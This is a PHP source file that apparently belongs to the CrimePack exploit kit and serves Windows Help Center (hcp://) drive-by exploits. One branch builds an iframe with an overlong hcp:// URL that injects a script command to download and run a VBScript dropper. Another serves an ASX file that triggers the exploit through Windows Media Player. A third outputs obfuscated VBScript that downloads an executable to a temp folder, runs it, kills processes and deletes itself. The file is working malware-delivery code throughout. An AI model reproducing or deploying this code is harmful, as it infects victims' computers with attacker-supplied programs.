<?php


function randVBFuncs($cagcajeedh, $becccffdjb, $dcfjfibdhe) {
	$cfaefdjje = '';
	$ebjcjeejg = 0;

	while ($ebjcjeejg <= $dcfjfibdhe) {
		$cfaefdjje .= 'Sub ' . $cagcajeedh . $ebjcjeejg . '():' . $cagcajeedh . ( $ebjcjeejg + 1 ) . ':End Sub:';
		++$ebjcjeejg;
	}

	$cfaefdjje .= 'Sub ' . $cagcajeedh . $ebjcjeejg . '():' . $becccffdjb . ':End Sub:';
	return $cfaefdjje;
}

include_once( 'CP-ENC-7531.php' );
include_once( 'hcp.stuff.php' );
include_once( 'cryptor.php' );

if (isset( $_GET['type'] )) {
	$type = $_GET['type'];
	$x = getChar( 2, 16 );
	switch ($type) {
	case 1: {
			if (( isset( $_GET['b'] ) && isset( $_GET['o'] ) )) {
				$content = 'cmd /c echo ' . $x[0] . '="' . $x[4] . '.vbs":With CreateObject("MSXML2.XMLHTTP"):.open "GET","' . $GLOBALS['cpXplHelper']->GetNormalURL(  ) . 'hcp.php?type=3&b=' . $_GET['b'] . '&o=' . $_GET['o'] . '",false:.send():Set ' . $x[1] . ' = CreateObject("Scripting.FileSystemObject"):' . $x[3] . ' = ' . $x[1] . '.GetSpecialFolder(2) + "\" + ' . $x[0] . ':Set ' . $x[5] . '=' . $x[1] . '.CreateTextFile(' . $x[3] . '):' . $x[5] . '.WriteLine .responseText:End With:' . $x[5] . '.Close:SET ' . $x[6] . ' = CreateObject("WScript.Shell"):' . $x[6] . '.Run ' . $x[3] . ' > %TEMP%\' . $x[4] . '.vbs && %TEMP%\' . $x[4] . '.vbs && taskkill /F /IM helpctr.exe && taskkill /F /IM wmplayer.exe';
					GetJS( base64_encode( mt_rand( 1000000, 999999999999999983222784 ) ), '<iframe src ="hcp://services/search?query=crimepack&topic=hcp://system/sysinfo/sysinfomain.htm%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A..%5C..%5Csysinfomain.htm%u003fsvr=%3Cscript%20defer%3Eeval(Run(String.fromCharCode(' . EncryptVB( $content ) . ')))%3C/script%3E">' );
				}

				break;
			}

			case 2: {
				if (( isset( $_GET['b'] ) && isset( $_GET['o'] ) )) {
					$content = '<ASX VERSION="3.0">
					<PARAM name="HTMLView" value="' . $GLOBALS['cpXplHelper']->GetNormalURL(  ) . 'hcp.php?type=1&o=' . $_GET['o'] . '&b=' . $_GET['b'] . '"/>
					<ENTRY>
					<REF href="' . $GLOBALS['cpXplHelper']->GetNormalURL(  ) . 'happy.gif"/>
					</ENTRY>
					</ASX>';
					header( 'Content-Disposition: inline; filename=' . GetRandom( 10 ) . '.asx
				' );
					header( 'Content-Type: video/x-ms-asf

				' );
					exit( $content );
				}

				break;
			}

			case 3: {
				if (( isset( $_GET['b'] ) && isset( $_GET['o'] ) )) {
					$y = chr( mt_rand( 65, 90 ) );
					$start = GetRandom( 8 );
					$dummy = GetRandom( 3 );
					$url = strrev( $GLOBALS['cpXplHelper']->GetURL( 'hcp', $_GET['b'], $_GET['o'], 'hcp' ) );
					$script = randVBFuncs( $y, $start, 75 ) . ':Sub ' . $start . '():	' . $x[2] . '=1:	' . $x[3] . '=false:	' . $x[5] . ' = StrReverse("' . $url . '"):	Set ' . $x[6] . ' = Createobject(StrReverse(Replace("t' . $dummy . 'c' . $dummy . 'e' . $dummy . 'jb' . $dummy . 'Om' . $dummy . 'et' . $dummy . 'sy' . $dummy . 'Se' . $dummy . 'li' . $dummy . 'F.' . $dummy . 'gn' . $dummy . 'it' . $dummy . 'pir' . $dummy . 'cS","' . $dummy . '",""))):	' . $x[7] . ' = ' . $x[6] . '.GetSpecialFolder(2) & "\test.exe":	' . $x[8] . ' = StrReverse("TEG"):	Set ' . $x[9] . ' = CreateObject(StrReverse(Replace("' . $dummy . 'PT' . $dummy . 'TH' . $dummy . 'LM' . $dummy . 'X.' . $dummy . '2L' . $dummy . 'MX' . $dummy . 'S' . $dummy . 'M","' . $dummy . '",""))):	Set ' . $x[10] . ' = CreateObject(StrReverse(Replace("m' . $dummy . 'ae' . $dummy . 'rt' . $dummy . 'S.B' . $dummy . 'D' . $dummy . 'OD' . $dummy . 'A","' . $dummy . '",""))):	Set ' . $x[11] . '=Createobject(StrReverse(Replace("t' . $dummy . 'cejb' . $dummy . 'O' . $dummy . 'metsy' . $dummy . 'S' . $dummy . 'eli' . $dummy . 'F.g' . $dummy . 'nit' . $dummy . 'pir' . $dummy . 'cS","' . $dummy . '",""))):On Error resume next:' . $x[9] . '.open ' . $x[8] . ', ' . $x[5] . ', ' . $x[3] . ':	' . $x[9] . '.send() :If ' . $x[9] . '.Status = 200 Then
				u=' . $x[9] . '.ResponseBody:' . $x[10] . '.Open:' . $x[10] . '.Type = ' . $x[2] . ':' . $x[10] . '.Write u:' . $x[10] . '.SaveToFile ' . $x[7] . ':' . $x[10] . '.Close
				End If:CreateObject(StrReverse("llehS.tpircSW")).eXeC ' . $x[7] . ':CreateObject(StrReverse("llehS.tpircSW")).eXeC StrReverse(Replace("' . $dummy . 'e' . $dummy . 'x' . $dummy . 'e' . $dummy . '.' . $dummy . 'r' . $dummy . 'e' . $dummy . 'y' . $dummy . 'a' . $dummy . 'l' . $dummy . 'pm' . $dummy . 'w M' . $dummy . 'I/ F' . $dummy . '/ l' . $dummy . 'li' . $dummy . 'kk' . $dummy . 's' . $dummy . 'at' . $dummy . '","' . $dummy . '","")):' . $x[14] . ' = ' . $x[6] . '.GetSpecialFolder(2) & "\" & wscript.scriptname:Set ' . $x[12] . '=' . $x[11] . '.GetFile(' . $x[14] . '):	' . $x[12] . '.Delete:End Sub:' . $y . '0';
					echo $script;
				}

				break;
			}

			default: {
			}
		}
	}

?>
